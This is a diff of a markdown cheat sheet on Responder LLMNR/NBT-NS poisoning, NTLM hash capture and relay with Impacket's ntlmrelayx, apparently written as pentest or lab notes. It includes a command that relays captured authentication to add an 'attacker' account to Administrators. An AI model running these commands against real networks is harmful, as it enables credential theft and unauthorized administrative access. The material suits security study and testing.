@@ -5,44 +5,6 @@
 
 ---
 
-## Protocol Overview
-
-### LLMNR (Link-Local Multicast Name Resolution)
-
-- Protocol: UDP/5355
-    
-- Purpose: Resolves local network hostnames when DNS fails.
-    
-- Exploitable: Yes. Windows systems fall back to LLMNR if DNS fails.
-    
-
-### NBT-NS (NetBIOS Name Service)
-
-- Protocol: UDP/137
-    
-- Legacy protocol for name resolution (Windows pre-Win10).
-    
-- Highly vulnerable to spoofing.
-    
-
-### mDNS (Multicast DNS)
-
-- Protocol: UDP/5353
-    
-- Used in macOS and IoT environments.
-    
-- Also spoofable via Responder.
-    
-
-When a system tries to access `\\UNRESOLVEDHOST`, it sends a broadcast like:
-
-```
-Who has UNRESOLVEDHOST?
-```
-
-Responder replies, "I do," causing the system to attempt SMB/HTTP auth to the attacker's IP.
-
----
 ## Running Responder
 
 ### Basic Usage
@@ -52,9 +14,7 @@ sudo responder -I tun0
 ```
 
 - `-I tun0`: Interface to bind to
-    
 - `-v`: Verbose mode
-    
 
 ### Recommended Usage
 
@@ -63,38 +23,28 @@ sudo responder -I tun0 -wrf
 ```
 
 - `-w`: Answer WPAD (Web Proxy Auto-Discovery) requests
-    
 - `-r`: Respond to NetBIOS Name Service (NBT-NS) requests
-    
 - `-f`: Respond to File/SMB requests
-    
 
 ### Logs and Hashes
 
 Responder writes captured hashes to:
 
 ```bash
-Responder/logs/<TARGET-IP>-SMB-NTLMv2-<timestamp>.txt
+Responder/logs/10.10.10.10-SMB-NTLMv2-<timestamp>.txt
 ```
 
 ---
 
 ## Credential Capture (NTLM Hashes)
 
-### NTLMv1/NTLMv2 Format Example:
+### NTLMv1/NTLMv2 Format
 
 ```
 USERNAME::DOMAIN:LMHASH:NTHASH:CHALLENGE:RESPONSE
 ```
 
-Captured hashes can be:
-
-- **Cracked** offline
-    
-- **Relayed** via `ntlmrelayx`
-    
-- **Injected** with tools like `pth-winexe`, `pth-smbclient`, etc.
-    
+Captured hashes can be cracked offline, relayed via `ntlmrelayx`, or injected with tools like `pth-winexe`, `pth-smbclient`.
 
 ---
 
@@ -122,8 +72,6 @@ cut -d ' ' -f 3 responder.log > responder_hashes.txt
 
 ## NTLM Relay Attacks (ntlmrelayx)
 
-Responder can be paired with **Impacket's ntlmrelayx** to **authenticate to other services** instead of cracking hashes.
-
 ### Disable SMB in Responder to Avoid Collision
 
 ```bash
@@ -149,14 +97,14 @@ ldap://192.168.1.20
 sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd 'P@ssw0rd123' --group 'Administrators'
 ```
 
-#### Supported Relay Targets:
+#### Supported Relay Targets
 
-| Protocol | Actions Available                                  |
-| -------- | -------------------------------------------------- |
-| SMB      | File access, command exec, add user                |
-| LDAP     | Dump domain info, modify AD objects                |
-| HTTP     | Limited use; enumerate or exploit upload endpoints |
-| MSSQL    | Run SQL queries as authenticated user              |
+| Protocol | Actions Available |
+| --- | --- |
+| SMB | File access, command exec, add user |
+| LDAP | Dump domain info, modify AD objects |
+| HTTP | Limited use; enumerate or exploit upload endpoints |
+| MSSQL | Run SQL queries as authenticated user |
 
 ---
 
@@ -165,7 +113,7 @@ sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd
 Disable specific protocols in `Responder.conf`:
 
 ```bash
-sudo mousepad /etc/responder/Responder.conf
+sudo nano /etc/responder/Responder.conf
 ```
 
 ```ini
